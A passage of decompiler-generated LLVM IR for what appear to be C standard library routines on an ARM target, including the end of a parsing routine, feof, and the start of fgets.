  store i32 ptrtoint (i32* @global_var_1d2a3.911 to i32), i32* %r1.global-to-local, align 4
  %v0_14624.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14620

dec_label_pc_14620:                               ; preds = %dec_label_pc_14620, %bb137
  %v0_14620 = phi i32 [ %v1_14620, %dec_label_pc_14620 ], [ ptrtoint (i32* @global_var_1d2a3.911 to i32), %bb137 ]
  %v1_14620 = add i32 %v0_14620, 1
  %v2_14620 = inttoptr i32 %v1_14620 to i8*
  %v3_14620 = load i8, i8* %v2_14620, align 1
  %v4_14620 = zext i8 %v3_14620 to i32
  store i32 %v4_14620, i32* %r3.global-to-local, align 4
  store i32 %v1_14620, i32* %r1.global-to-local, align 4
  %v8_14628 = icmp sgt i32 %v0_14624.pre, %v4_14620
  br i1 %v8_14628, label %dec_label_pc_14620, label %dec_label_pc_1462c

dec_label_pc_1462c:                               ; preds = %dec_label_pc_14620
  store i32 ptrtoint (i32* @global_var_1d294.915 to i32), i32* %r0.global-to-local, align 4
  %v2_14634 = sub i32 %v1_14620, ptrtoint (i32* @global_var_1d2a4.913 to i32)
  %v2_14638 = mul i32 %v2_14634, 2
  store i32 %v2_14638, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1d284.917 to i32), i32* %ip.global-to-local, align 4
  %v2_14640 = add i32 %v2_14638, ptrtoint (i32* @global_var_1d294.915 to i32)
  store i32 %v2_14640, i32* %r2.global-to-local, align 4
  %v1_14644 = add i32 %v2_14638, add (i32 ptrtoint (i32* @global_var_1d294.915 to i32), i32 1)
  %v2_14644 = inttoptr i32 %v1_14644 to i8*
  %v3_14644 = load i8, i8* %v2_14644, align 1
  %v4_14644 = zext i8 %v3_14644 to i32
  store i32 %v4_14644, i32* %r1.global-to-local, align 4
  %v2_14648 = add i32 %v2_14638, ptrtoint (i32* @global_var_1d284.917 to i32)
  store i32 %v2_14648, i32* %r2.global-to-local, align 4
  %v3_1464c = inttoptr i32 %v2_14640 to i8*
  %v4_1464c = load i8, i8* %v3_1464c, align 2
  %v6_1464c = zext i8 %v4_1464c to i32
  store i32 %v6_1464c, i32* %r0.global-to-local, align 4
  %v1_14650 = add i32 %v2_14638, add (i32 ptrtoint (i32* @global_var_1d284.917 to i32), i32 1)
  %v2_14650 = inttoptr i32 %v1_14650 to i8*
  %v3_14650 = load i8, i8* %v2_14650, align 1
  %v4_14650 = zext i8 %v3_14650 to i32
  store i32 %v4_14650, i32* %r2.global-to-local, align 4
  %v3_14654 = inttoptr i32 %v2_14648 to i8*
  %v4_14654 = load i8, i8* %v3_14654, align 2
  %v6_14654 = zext i8 %v4_14654 to i32
  %v3_14658 = mul nuw i32 %v4_14644, 16777216
  store i32 %v3_14658, i32* %r1.global-to-local, align 4
  %v4_1465c = sdiv i32 %v3_14658, 65536
  %v5_1465c = or i32 %v6_1464c, %v4_1465c
  %v3_14660 = mul nuw i32 %v4_14650, 16777216
  store i32 %v3_14660, i32* %r2.global-to-local, align 4
  %v4_14664 = sdiv i32 %v3_14660, 65536
  %v5_14664 = or i32 %v6_14654, %v4_14664
  store i32 %v5_14664, i32* %r3.global-to-local, align 4
  %v0_14668 = load i32, i32* @lr, align 4
  %v2_14668 = or i32 %v5_1465c, %v0_14668
  store i32 ptrtoint ([21 x i8]* @global_var_1d2b0.909 to i32), i32* %ip.global-to-local, align 4
  %v2_14670 = and i32 %v2_14668, %v5_14664
  store i32 %v2_14670, i32* %r0.global-to-local, align 4
  %v0_1468c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14684

dec_label_pc_14678:                               ; preds = %dec_label_pc_145f4
  %v1_14678 = add i32 %v1_14604, 1
  %v2_14678 = inttoptr i32 %v1_14678 to i8*
  %v3_14678 = load i8, i8* %v2_14678, align 1
  %v4_14678 = zext i8 %v3_14678 to i32
  store i32 %v4_14678, i32* %r3.global-to-local, align 4
  store i32 %v1_14678, i32* %ip.global-to-local, align 4
  %v2_1467c = icmp eq i8 %v3_14678, 0
  br i1 %v2_1467c, label %dec_label_pc_14684, label %dec_label_pc_145f4

dec_label_pc_14684:                               ; preds = %dec_label_pc_14678, %dec_label_pc_1462c
  %v0_14690 = phi i32 [ %v0_14668, %dec_label_pc_1462c ], [ %v3_145e4, %dec_label_pc_14678 ]
  %v0_1468c = phi i32 [ %v0_1468c.pre, %dec_label_pc_1462c ], [ %v0_145d8, %dec_label_pc_14678 ]
  %v0_14684 = phi i32 [ %v2_14670, %dec_label_pc_1462c ], [ %v3_145f0, %dec_label_pc_14678 ]
  store i32 %v0_14684, i32* %stack_var_-36, align 4
  %v0_14688 = load i32, i32* @r4, align 4
  %v1_14688 = and i32 %v0_14688, 4
  %v1_1468c = inttoptr i32 %v0_1468c to i8*
  %v2_1468c = load i8, i8* %v1_1468c, align 1
  %v3_1468c = zext i8 %v2_1468c to i32
  store i32 %v3_1468c, i32* %r1.global-to-local, align 4
  %v1_14690 = and i32 %v0_14690, 3840
  %v1_14694 = and i32 %v0_14688, -5
  %v2_14698 = or i32 %v1_14694, %v1_14690
  store i32 %v2_14698, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %tmp164 = mul nuw nsw i32 %v1_14688, 4
  %tmp165 = or i32 %tmp164, 32
  store i32 %tmp165, i32* %r3.global-to-local, align 4
  %v1_146a8 = load i32, i32* %r7.global-to-local, align 4
  %v2_146a8 = add i32 %v1_146a8, 12
  %v3_146a8 = inttoptr i32 %v2_146a8 to i32*
  store i32 %v3_1468c, i32* %v3_146a8, align 4
  %v0_146ac = load i32, i32* %r7.global-to-local, align 4
  %v1_146ac = add i32 %v0_146ac, 4
  %v2_146ac = inttoptr i32 %v1_146ac to i32*
  %v3_146ac = load i32, i32* @r5, align 4
  store i32 %v3_146ac, i32* %v2_146ac, align 4
  %v4_146ac = add i32 %v0_146ac, 8
  %v5_146ac = inttoptr i32 %v4_146ac to i32*
  %v6_146ac = load i32, i32* %r8.global-to-local, align 4
  store i32 %v6_146ac, i32* %v5_146ac, align 4
  %v0_146b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_146b0 = load i32, i32* %r7.global-to-local, align 4
  %v2_146b0 = add i32 %v1_146b0, 20
  %v3_146b0 = inttoptr i32 %v2_146b0 to i32*
  store i32 %v0_146b0, i32* %v3_146b0, align 4
  %v0_146b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_146b4 = load i32, i32* %r7.global-to-local, align 4
  %v2_146b4 = add i32 %v1_146b4, 16
  %v3_146b4 = inttoptr i32 %v2_146b4 to i32*
  store i32 %v0_146b4, i32* %v3_146b4, align 4
  %v0_146b8 = load i32, i32* %r0.global-to-local, align 4
  %v1_146b8 = load i32, i32* %r7.global-to-local, align 4
  %v2_146b8 = add i32 %v1_146b8, 28
  %v3_146b8 = inttoptr i32 %v2_146b8 to i32*
  store i32 %v0_146b8, i32* %v3_146b8, align 4
  %v0_146bc = load i32, i32* %ip.global-to-local, align 4
  %v1_146bc = inttoptr i32 %v0_146bc to i8*
  %v2_146bc = load i8, i8* %v1_146bc, align 1
  %v3_146bc = zext i8 %v2_146bc to i32
  store i32 %v3_146bc, i32* %r2.global-to-local, align 4
  %v2_146c0 = icmp eq i8 %v2_146bc, 0
  br i1 %v2_146c0, label %dec_label_pc_146c8, label %dec_label_pc_146e0

dec_label_pc_146c8:                               ; preds = %dec_label_pc_14684
  %v0_146c8 = load i32, i32* %r6.global-to-local, align 4
  %v1_146c8 = inttoptr i32 %v0_146c8 to i8*
  %v2_146c8 = load i8, i8* %v1_146c8, align 1
  %v3_146c8 = zext i8 %v2_146c8 to i32
  store i32 %v3_146c8, i32* %r3.global-to-local, align 4
  %v7_146cc = icmp eq i8 %v2_146c8, 109
  br i1 %v7_146cc, label %dec_label_pc_146d4, label %dec_label_pc_147e4

dec_label_pc_146d4:                               ; preds = %dec_label_pc_146c8
  store i32 20, i32* %r3.global-to-local, align 4
  %v1_146d8 = load i32, i32* %r7.global-to-local, align 4
  %v2_146d8 = add i32 %v1_146d8, 32
  %v3_146d8 = inttoptr i32 %v2_146d8 to i32*
  store i32 20, i32* %v3_146d8, align 4
  %v0_146dc = load i32, i32* %r2.global-to-local, align 4
  %v1_146dc = load i32, i32* %r7.global-to-local, align 4
  %v2_146dc = add i32 %v1_146dc, 28
  %v3_146dc = inttoptr i32 %v2_146dc to i32*
  store i32 %v0_146dc, i32* %v3_146dc, align 4
  br label %dec_label_pc_146e0

dec_label_pc_146e0:                               ; preds = %dec_label_pc_14684, %dec_label_pc_146d4
  %v0_146e0 = load i32, i32* %sb.global-to-local, align 4
  %tmp141 = icmp slt i32 %v0_146e0, 1
  br i1 %tmp141, label %dec_label_pc_14798, label %dec_label_pc_146e8

dec_label_pc_146e8:                               ; preds = %dec_label_pc_146e0
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_146ec

dec_label_pc_146ec:                               ; preds = %dec_label_pc_14780, %dec_label_pc_146e8
  %v8_14708 = phi i32 [ 0, %dec_label_pc_146e8 ], [ %v1_14784, %dec_label_pc_14780 ]
  %v7_146f0 = icmp sgt i32 %v8_14708, 2
  br i1 %v7_146f0, label %bb143, label %bb142

bb142:                                            ; preds = %dec_label_pc_146ec
  store i32 %v25_14350, i32* %r2.global-to-local, align 4
  %v12_146f4 = mul i32 %v8_14708, 4
  %v13_146f4 = add i32 %v12_146f4, %v25_14350
  store i32 %v13_146f4, i32* %r3.global-to-local, align 4
  %v9_146f8 = add i32 %v13_146f4, -24
  %v10_146f8 = inttoptr i32 %v9_146f8 to i32*
  %v11_146f8 = load i32, i32* %v10_146f8, align 4
  store i32 %v11_146f8, i32* %r2.global-to-local, align 4
  %v9_146fc = load i32, i32* %r7.global-to-local, align 4
  %v10_146fc = add i32 %v9_146fc, %v8_14708
  store i32 %v10_146fc, i32* %r3.global-to-local, align 4
  %v9_14704 = trunc i32 %v11_146f8 to i8
  %v11_14704 = add i32 %v10_146fc, 36
  %v12_14704 = inttoptr i32 %v11_14704 to i8*
  store i8 %v9_14704, i8* %v12_14704, align 1
  %v8_1470c = load i32, i32* %r3.global-to-local, align 4
  %v9_1470c = add i32 %v8_1470c, 36
  %v10_1470c = inttoptr i32 %v9_1470c to i8*
  %v11_1470c = load i8, i8* %v10_1470c, align 1
  %v12_1470c = zext i8 %v11_1470c to i32
  br label %bb144

bb143:                                            ; preds = %dec_label_pc_146ec
  %v10_14708 = add i32 %v8_14708, %stack_var_-48.3
  store i32 %v10_14708, i32* %r3.global-to-local, align 4
  %v9_14710 = add i32 %v10_14708, -2
  br label %bb144

bb144:                                            ; preds = %bb142, %bb143
  %v0_14734 = phi i32 [ %v12_1470c, %bb142 ], [ %v9_14710, %bb143 ]
  store i32 %v0_14734, i32* @r2, align 4
  %v1_14714 = load i32, i32* %sb.global-to-local, align 4
  %v2_14714 = sub i32 %v0_14734, %v1_14714
  %v4_14714 = xor i32 %v1_14714, %v0_14734
  %v5_14714 = xor i32 %v2_14714, %v0_14734
  %v6_14714 = and i32 %v5_14714, %v4_14714
  %v7_14714 = icmp slt i32 %v6_14714, 0
  %v8_14714 = icmp slt i32 %v2_14714, 0
  %v9_14714 = icmp eq i32 %v0_14734, %v1_14714
  %v3_14718 = xor i1 %v8_14714, %v7_14714
  %v4_14718 = or i1 %v9_14714, %v3_14718
  br i1 %v4_14718, label %dec_label_pc_14728, label %dec_label_pc_1471c

dec_label_pc_1471c:                               ; preds = %bb144
  %v1_1471c = add i32 %v0_14734, -9
  %v3_1471c = sub i32 8, %v0_14734
  %v4_1471c = and i32 %v3_1471c, %v0_14734
  %v5_1471c = icmp slt i32 %v4_1471c, 0
  %v6_1471c = icmp slt i32 %v1_1471c, 0
  %v7_1471c = icmp eq i32 %v0_14734, 9
  %v3_14720 = xor i1 %v6_1471c, %v5_1471c
  %v4_14720 = or i1 %v7_1471c, %v3_14720
  br i1 %v4_14720, label %dec_label_pc_14724, label %dec_label_pc_147e4

dec_label_pc_14724:                               ; preds = %dec_label_pc_1471c
  store i32 %v0_14734, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_14728

dec_label_pc_14728:                               ; preds = %bb144, %dec_label_pc_14724
  store i32 %v25_14350, i32* %ip.global-to-local, align 4
  %v1_1472c = load i32, i32* %r8.global-to-local, align 4
  %v4_1472c = mul i32 %v1_1472c, 4
  %v5_1472c = add i32 %v4_1472c, %v25_14350
  store i32 %v5_1472c, i32* %r3.global-to-local, align 4
  %v1_14730 = add i32 %v5_1472c, -12
  %v2_14730 = inttoptr i32 %v1_14730 to i32*
  %v3_14730 = load i32, i32* %v2_14730, align 4
  store i32 %v3_14730, i32* %r5.global-to-local, align 4
  %v1_14734 = add i32 %v0_14734, -1
  store i32 %v1_14734, i32* %sl.global-to-local, align 4
  %v0_14738 = load i32, i32* %r7.global-to-local, align 4
  %v4_14738 = mul i32 %v1_14734, 4
  %v5_14738 = add i32 %v0_14738, %v4_14738
  store i32 %v5_14738, i32* %r3.global-to-local, align 4
  %v7_1473c = icmp eq i32 %v3_14730, 8
  %v1_14740 = add i32 %v5_14738, 40
  %v2_14740 = inttoptr i32 %v1_14740 to i32*
  %v3_14740 = load i32, i32* %v2_14740, align 4
  store i32 %v3_14740, i32* @r0, align 4
  br i1 %v7_1473c, label %dec_label_pc_14780, label %dec_label_pc_14748

dec_label_pc_14748:                               ; preds = %dec_label_pc_14728
  %v9_14748 = icmp eq i32 %v3_14740, %v3_14730
  br i1 %v9_14748, label %dec_label_pc_1476c, label %bb145

bb145:                                            ; preds = %dec_label_pc_14748
  %v8_1474c = icmp eq i32 %v3_14740, 8
  br i1 %v8_1474c, label %dec_label_pc_1476c, label %dec_label_pc_14754

dec_label_pc_14754:                               ; preds = %bb145
  %v0_14754 = call i32 @_promoted_size()
  %v0_1475c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1475c, i32* @r0, align 4
  %v0_14760 = call i32 @_promoted_size()
  store i32 %v0_14760, i32* %r0.global-to-local, align 4
  %v8_14768 = icmp sgt i32 %v0_14754, %v0_14760
  br i1 %v8_14768, label %dec_label_pc_14780, label %dec_label_pc_14754.dec_label_pc_1476c_crit_edge

dec_label_pc_14754.dec_label_pc_1476c_crit_edge:  ; preds = %dec_label_pc_14754
  %v1_14770.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_14778.pre = load i32, i32* %r7.global-to-local, align 4
  %v1_14778.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_1476c

dec_label_pc_1476c:                               ; preds = %dec_label_pc_14754.dec_label_pc_1476c_crit_edge, %dec_label_pc_14748, %bb145
  %v1_14778 = phi i32 [ %v1_14778.pre, %dec_label_pc_14754.dec_label_pc_1476c_crit_edge ], [ %v1_14734, %dec_label_pc_14748 ], [ %v1_14734, %bb145 ]
  %v0_14778 = phi i32 [ %v0_14778.pre, %dec_label_pc_14754.dec_label_pc_1476c_crit_edge ], [ %v0_14738, %dec_label_pc_14748 ], [ %v0_14738, %bb145 ]
  %v1_14770 = phi i32 [ %v1_14770.pre, %dec_label_pc_14754.dec_label_pc_1476c_crit_edge ], [ %v1_1472c, %dec_label_pc_14748 ], [ %v1_1472c, %bb145 ]
  store i32 %v25_14350, i32* %r1.global-to-local, align 4
  %v4_14770 = mul i32 %v1_14770, 4
  %v5_14770 = add i32 %v4_14770, %v25_14350
  store i32 %v5_14770, i32* %r3.global-to-local, align 4
  %v1_14774 = add i32 %v5_14770, -12
  %v2_14774 = inttoptr i32 %v1_14774 to i32*
  %v3_14774 = load i32, i32* %v2_14774, align 4
  store i32 %v3_14774, i32* @r2, align 4
  %v4_14778 = mul i32 %v1_14778, 4
  %v5_14778 = add i32 %v4_14778, %v0_14778
  store i32 %v5_14778, i32* %r3.global-to-local, align 4
  %v2_1477c = add i32 %v5_14778, 40
  %v3_1477c = inttoptr i32 %v2_1477c to i32*
  store i32 %v3_14774, i32* %v3_1477c, align 4
  br label %dec_label_pc_14780

dec_label_pc_14780:                               ; preds = %dec_label_pc_14754, %dec_label_pc_14728, %dec_label_pc_1476c
  %v0_14780 = load i32, i32* %r7.global-to-local, align 4
  %v1_14780 = add i32 %v0_14780, 28
  %v2_14780 = inttoptr i32 %v1_14780 to i32*
  %v3_14780 = load i32, i32* %v2_14780, align 4
  %v0_14784 = load i32, i32* %r8.global-to-local, align 4
  %v1_14784 = add i32 %v0_14784, 1
  store i32 %v1_14784, i32* %r8.global-to-local, align 4
  %v1_14788 = add i32 %v3_14780, 2
  store i32 %v1_14788, i32* %r3.global-to-local, align 4
  %v6_14790 = icmp slt i32 %v1_14784, %v1_14788
  br i1 %v6_14790, label %dec_label_pc_146ec, label %dec_label_pc_147b0

dec_label_pc_14798:                               ; preds = %dec_label_pc_146e0
  %v0_14798 = load i32, i32* %r7.global-to-local, align 4
  %v1_14798 = add i32 %v0_14798, 28
  %v2_14798 = inttoptr i32 %v1_14798 to i32*
  %v3_14798 = load i32, i32* %v2_14798, align 4
  store i32 %v3_14798, i32* %r2.global-to-local, align 4
  %v0_1479c = load i32, i32* %r0.global-to-local, align 4
  %v1_1479c = trunc i32 %v0_1479c to i8
  %v3_1479c = add i32 %v0_14798, 38
  %v4_1479c = inttoptr i32 %v3_1479c to i8*
  store i8 %v1_1479c, i8* %v4_1479c, align 1
  %v0_147a0 = load i32, i32* %r2.global-to-local, align 4
  %v3_147a0 = mul i32 %v0_147a0, 4
  store i32 %v3_147a0, i32* @r2, align 4
  %v0_147a4 = load i32, i32* %r7.global-to-local, align 4
  %v1_147a4 = add i32 %v0_147a4, 40
  store i32 %v1_147a4, i32* @r0, align 4
  %v2_147a8 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_147a8, i32* @r1, align 4
  %v0_147ac = call i32 @memcpy()
  store i32 %v0_147ac, i32* %r0.global-to-local, align 4
  %v0_147b0.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_147b0

dec_label_pc_147b0:                               ; preds = %dec_label_pc_14780, %dec_label_pc_14798
  %v2_147cc = phi i32 [ %v0_147b0.pre, %dec_label_pc_14798 ], [ %v0_14780, %dec_label_pc_14780 ]
  %v1_147b0 = add i32 %v2_147cc, 16
  %v2_147b0 = inttoptr i32 %v1_147b0 to i32*
  %v3_147b0 = load i32, i32* %v2_147b0, align 4
  store i32 %v3_147b0, i32* %r3.global-to-local, align 4
  %v1_147b4 = and i32 %v3_147b0, 128
  %v2_147b4 = icmp eq i32 %v1_147b4, 0
  br i1 %v2_147b4, label %.thread46, label %.thread44

.thread44:                                        ; preds = %dec_label_pc_147b0
  store i32 %v2_14358, i32* %r3.global-to-local, align 4
  %v2_147bc = inttoptr i32 %v2_147cc to i32*
  %v3_147bc = load i32, i32* %v2_147bc, align 4
  %v2_147c4.pre = load i32, i32* %r6.global-to-local, align 4
  %v3_147c4 = sub i32 %v2_147c4.pre, %v2_14358
  store i32 %v3_147c4, i32* %r3.global-to-local, align 4
  %v5_147c8 = mul i32 %v3_147c4, 4
  %v6_147c8 = add i32 %v5_147c8, %v3_147bc
  store i32 %v6_147c8, i32* @r2, align 4
  br label %bb146

.thread46:                                        ; preds = %dec_label_pc_147b0
  %v1_147c041 = load i32, i32* %r6.global-to-local, align 4
  %v2_147c042 = add i32 %v1_147c041, 1
  store i32 %v2_147c042, i32* %r3.global-to-local, align 4
  %v3_147cc = inttoptr i32 %v2_147cc to i32*
  store i32 %v2_147c042, i32* %v3_147cc, align 4
  %v0_147d0.pre = load i32, i32* %r7.global-to-local, align 4
  br label %bb146

bb146:                                            ; preds = %.thread44, %.thread46
  %v1_147d8 = phi i32 [ %v2_147cc, %.thread44 ], [ %v0_147d0.pre, %.thread46 ]
  %v1_147d0 = add i32 %v1_147d8, 28
  %v2_147d0 = inttoptr i32 %v1_147d0 to i32*
  %v3_147d0 = load i32, i32* %v2_147d0, align 4
  store i32 %v3_147d0, i32* %r3.global-to-local, align 4
  %v1_147d4 = add i32 %v3_147d0, 2
  store i32 %v1_147d4, i32* %r0.global-to-local, align 4
  %v0_147d8 = load i32, i32* %sb.global-to-local, align 4
  %v2_147d8 = add i32 %v1_147d8, 24
  %v3_147d8 = inttoptr i32 %v2_147d8 to i32*
  store i32 %v0_147d8, i32* %v3_147d8, align 4
  br i1 %v2_147b4, label %dec_label_pc_147e8, label %bb147

bb147:                                            ; preds = %bb146
  %v1_147dc = load i32, i32* @r2, align 4
  %v2_147dc = load i32, i32* %r7.global-to-local, align 4
  %v3_147dc = inttoptr i32 %v2_147dc to i32*
  store i32 %v1_147dc, i32* %v3_147dc, align 4
  br label %dec_label_pc_147e8

dec_label_pc_147e4:                               ; preds = %dec_label_pc_143a0, %dec_label_pc_144ac, %dec_label_pc_1455c, %dec_label_pc_14530, %dec_label_pc_1453c, %dec_label_pc_1447c, %dec_label_pc_1471c, %dec_label_pc_146c8, %.thread25
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_147e8

dec_label_pc_147e8:                               ; preds = %bb147, %bb146, %dec_label_pc_147e4
  %v2_147ec = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_147ec, i32* @r4, align 4
  store i32 %v6_14350, i32* @r5, align 4
  %v26_147ec = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v26_147ec

; uselistorder directives
  uselistorder i32 %v3_147c4, { 1, 0 }
  uselistorder i32 %v1_14784, { 1, 2, 0 }
  uselistorder i32 %v0_14738, { 1, 2, 0 }
  uselistorder i32 %v2_14714, { 1, 0 }
  uselistorder i32 %v1_14714, { 1, 0, 2 }
  uselistorder i32 %v0_14734, { 3, 4, 5, 0, 7, 6, 9, 1, 2, 8, 10 }
  uselistorder i32 %v1_14678, { 1, 2, 0 }
  uselistorder i32 %v3_14660, { 1, 0 }
  uselistorder i32 %v3_14658, { 1, 0 }
  uselistorder i32 %v2_14638, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_14620, { 0, 2, 3, 1 }
  uselistorder i32 %v1_14604, { 1, 0, 2 }
  uselistorder i32 %v3_145e4, { 2, 1, 0 }
  uselistorder i32 %v1_145a8, { 0, 2, 3, 1 }
  uselistorder i32 %v2_1457c, { 1, 0 }
  uselistorder i32 %v5_144dc, { 0, 1, 3, 2 }
  uselistorder i32 %v0_144dc, { 1, 0 }
  uselistorder i32 %storemerge105, { 1, 0, 4, 5, 2, 3 }
  uselistorder i32 %stack_var_-48.2, { 1, 0 }
  uselistorder i32 %v2_14488, { 1, 0 }
  uselistorder i32 %v0_144a4, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_1446c, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_14454, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder i32 %v3_14440, { 1, 2, 0 }
  uselistorder i32 %v0_144b8, { 1, 2, 3, 0, 4, 7, 5, 6 }
  uselistorder i32 %stack_var_-48.1, { 1, 2, 3, 0 }
  uselistorder i32 %v0_143f4, { 1, 0 }
  uselistorder i32 %v1_143c4, { 0, 2, 1 }
  uselistorder i32 %v25_14350, { 0, 8, 1, 9, 2, 7, 3, 10, 4, 5, 6 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i32* %stack_var_-36, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 3, 2, 1, 4 }
  uselistorder i32* %sb.global-to-local, { 4, 0, 5, 6, 7, 1, 2, 3, 8, 9 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 3, 2, 4, 7, 6, 5, 8 }
  uselistorder i32* %r7.global-to-local, { 1, 17, 16, 2, 6, 3, 15, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 0, 18 }
  uselistorder i32* %r6.global-to-local, { 14, 8, 10, 12, 0, 2, 11, 3, 4, 5, 7, 13, 15, 6, 1, 9 }
  uselistorder i32* %r3.global-to-local, { 3, 0, 11, 4, 5, 6, 7, 8, 9, 10, 12, 13, 14, 15, 17, 16, 1, 2, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 41, 42, 43, 39, 40, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 14, 15, 11, 12, 0, 16 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 1, 4, 6, 5, 7, 8, 9, 10, 11, 12, 23, 22, 13, 25, 14, 15, 16, 26, 17, 27, 18, 28, 19, 20, 21, 24, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 8, 7 }
  uselistorder i32 38, { 1, 0, 2 }
  uselistorder i32 ()* @_promoted_size, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1d284.917 to i32), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_1d294.915 to i32), { 1, 0, 2 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_1d2b0.909 to i32), { 2, 1, 3, 0, 4 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_1d270.907 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 2, 3, 4, 1, 5, 0, 6, 7 }
  uselistorder label %dec_label_pc_147e8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_147e4, { 6, 7, 8, 2, 4, 3, 1, 5, 0 }
  uselistorder label %bb146, { 1, 0 }
  uselistorder label %dec_label_pc_147b0, { 1, 0 }
  uselistorder label %dec_label_pc_14780, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1476c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_14728, { 1, 0 }
  uselistorder label %bb144, { 1, 0 }
  uselistorder label %dec_label_pc_146e0, { 1, 0 }
  uselistorder label %bb137, { 2, 1, 0 }
  uselistorder label %.thread25, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14594, { 1, 0 }
  uselistorder label %dec_label_pc_1456c, { 1, 0 }
  uselistorder label %dec_label_pc_1451c, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_1449c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14498, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %.backedge, { 1, 0, 2 }
  uselistorder label %dec_label_pc_143f8, { 1, 0 }
  uselistorder label %dec_label_pc_143e8, { 1, 0 }
}

define i32 @feof(i8* %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_14814 = load i32, i32* @r4, align 4
  store i32 %v3_14814, i32* %stack_var_-16, align 4
  %v2_14818 = add i32 %tmp, 52
  %v3_14818 = inttoptr i32 %v2_14818 to i32*
  %v4_14818 = load i32, i32* %v3_14818, align 4
  store i32 %v4_14818, i32* %r6.global-to-local, align 4
  %v2_14820 = ptrtoint i32* %stack_var_-32 to i32
  %v2_14824 = icmp eq i32 %v4_14818, 0
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %v2_14820, i32* @r0, align 4
  br i1 %v2_14824, label %dec_label_pc_1483c, label %dec_label_pc_14858

dec_label_pc_1483c:                               ; preds = %entry
  %v1_14844 = call i32 @__pthread_return_void()
  %v1_14854 = call i32 @__pthread_return_0()
  %v0_14858.pre = load i32, i32* %r4.global-to-local, align 4
  %v0_14860.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14858

dec_label_pc_14858:                               ; preds = %entry, %dec_label_pc_1483c
  %v0_14860 = phi i32 [ %v4_14818, %entry ], [ %v0_14860.pre, %dec_label_pc_1483c ]
  %v0_14858 = phi i32 [ %tmp, %entry ], [ %v0_14858.pre, %dec_label_pc_1483c ]
  %v1_14858 = add i32 %v0_14858, 1
  %v2_14858 = inttoptr i32 %v1_14858 to i8*
  %v3_14858 = load i8, i8* %v2_14858, align 1
  %v4_14858 = zext i8 %v3_14858 to i32
  %v1_1485c = inttoptr i32 %v0_14858 to i8*
  %v2_1485c = load i8, i8* %v1_1485c, align 1
  %v3_1485c = zext i8 %v2_1485c to i32
  %v2_14860 = icmp eq i32 %v0_14860, 0
  %v4_1486c = mul nuw nsw i32 %v4_14858, 256
  %v5_1486c = or i32 %v3_1485c, %v4_1486c
  store i32 %v5_1486c, i32* %r4.global-to-local, align 4
  br i1 %v2_14860, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_14858
  call void @__pseudo_branch(i32 94268)
  %v0_1487c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_14858, %bb
  %v0_1487c = phi i32 [ %v5_1486c, %dec_label_pc_14858 ], [ %v0_1487c.pre, %bb ]
  %v1_1487c = and i32 %v0_1487c, 4
  %v2_14884 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14884, i32* @r4, align 4
  ret i32 %v1_1487c

; uselistorder directives
  uselistorder i32 %v0_14858, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_14858, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
